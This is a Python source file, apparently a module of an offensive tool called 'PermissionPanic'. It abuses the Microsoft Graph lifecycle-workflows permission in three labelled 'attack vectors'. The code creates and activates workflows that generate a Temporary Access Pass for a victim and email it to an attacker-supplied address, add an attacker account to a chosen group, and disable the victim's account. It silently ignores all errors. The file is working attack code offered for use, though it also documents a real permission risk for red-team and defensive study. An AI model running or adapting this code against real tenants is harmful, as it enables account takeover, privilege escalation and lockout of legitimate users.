import requests
import colorama
from colorama import Fore, Style

# add adding to teams
def lifecycle_Vectors(request_headers, LifecycleSettings):
    print()
    print(
        "LifecycleWorkflows.ReadWrite.All - Allows the app to create, update, list, read and delete all workflows, "
        "tasks and related lifecycle workflows resources without a signed-in user.")
    print()
    try:
        print("Attack vector - get new passwords for users")

        create_message_URL = "https://graph.microsoft.com/v1.0/identityGovernance/lifecycleWorkflows/workflows"
        message_obj = {"category":"joiner","displayName":"Post-Onboarding PermissionPanic","description":"Configure Post-Onboarding PermissionPanic","tasks":[{"arguments":[{"name":"tapLifetimeMinutes","value":"60"},{"name":"tapIsUsableOnce","value":"false"},{"name":"cc","value":LifecycleSettings["userCC"]}],"description":"Generate Temporary Access Pass and send via email to user's manager and more user","displayName":"Generate TAP and Send Email","isEnabled":"true","continueOnError":"false","taskDefinitionId":"1b555e50-7f65-41d5-b514-5894a026d10d","category":"joiner"}],"executionConditions":{"@odata.type":"#microsoft.graph.identityGovernance.triggerAndScopeBasedConditions","scope":{"@odata.type":"microsoft.graph.identityGovernance.ruleBasedSubjectSet","rule":"(department eq 'Marketing')"},"trigger":{"@odata.type":"#microsoft.graph.identityGovernance.timeBasedAttributeTrigger","offsetInDays":7,"timeBasedAttribute":"createdDateTime"}},"isEnabled":"true","isSchedulingEnabled":"false"}

        result = requests.post(create_message_URL, json=message_obj, headers=request_headers)
        json = result.json()
        id = json["id"]

        if result.status_code == 201:
            create_message_URL = "https://graph.microsoft.com/v1.0/identityGovernance/lifecycleWorkflows/workflows/" + id + "/activate"
            message_obj = {"subjects":[{"id":LifecycleSettings["victim"]}]}
            result = requests.post(create_message_URL, json=message_obj, headers=request_headers)
            if result.status_code == 204:
                print(Fore.GREEN + "set up a tap! ")
                print(Style.RESET_ALL)

        print("Attack vector - add to groups ")
        create_message_URL = "https://graph.microsoft.com/v1.0/identityGovernance/lifecycleWorkflows/workflows"
        message_obj = {"category":"mover","displayName":"Real-time PermissionPanic to group","description":"Execute real-time tasks for employee job changes","tasks":[{"arguments":[{"name":"groupID","value":LifecycleSettings["groupId"]}],"description":"Add user to selected groups","displayName":"Add user to groups","isEnabled":"true","continueOnError":"false","taskDefinitionId":"22085229-5809-45e8-97fd-270d28d66910","category":"joiner,leaver,mover"}],"executionConditions":{"@odata.type":"#microsoft.graph.identityGovernance.onDemandExecutionOnly"},"isEnabled":"true","isSchedulingEnabled":"false"}
        result = requests.post(create_message_URL, json=message_obj, headers=request_headers)
        json = result.json()
        id = json["id"]

        if result.status_code == 201:
            create_message_URL = "https://graph.microsoft.com/v1.0/identityGovernance/lifecycleWorkflows/workflows/" + id + "/activate"
            message_obj = {"subjects": [{"id": LifecycleSettings["attacker"]}]}
            result = requests.post(create_message_URL, json=message_obj, headers=request_headers)

            if result.status_code == 204:
                print(Fore.GREEN + "added user to group ")
                print(Style.RESET_ALL)

        print("Attack vector - disable users ")
        create_message_URL = "https://graph.microsoft.com/v1.0/identityGovernance/lifecycleWorkflows/workflows"
        message_obj = {"category":"joiner","displayName":"Onboard PermissionPanic","description":"Configure new PermissionPanic tasks","tasks":[{"arguments":[],"description":"Disable user account in the directory","displayName":"Disable User Account","isEnabled":"true","continueOnError":"false","taskDefinitionId":"1dfdfcc7-52fa-4c2e-bf3a-e3919cc12950","category":"joiner,leaver"}],"executionConditions":{"@odata.type":"#microsoft.graph.identityGovernance.triggerAndScopeBasedConditions","scope":{"@odata.type":"microsoft.graph.identityGovernance.ruleBasedSubjectSet","rule":"(department eq 'Marketing')"},"trigger":{"@odata.type":"#microsoft.graph.identityGovernance.timeBasedAttributeTrigger","offsetInDays":0,"timeBasedAttribute":"createdDateTime"}},"isEnabled":"true","isSchedulingEnabled":"true"}
        result = requests.post(create_message_URL, json=message_obj, headers=request_headers)
        json = result.json()
        id = json["id"]

        if result.status_code == 201:
            create_message_URL = "https://graph.microsoft.com/v1.0/identityGovernance/lifecycleWorkflows/workflows/" + id + "/activate"
            message_obj = {"subjects": [{"id": LifecycleSettings["victim"]}]}
            result = requests.post(create_message_URL, json=message_obj, headers=request_headers)

            if result.status_code == 204:
                print(Fore.GREEN + "disabled user ")
                print(Style.RESET_ALL)
    except:
        pass
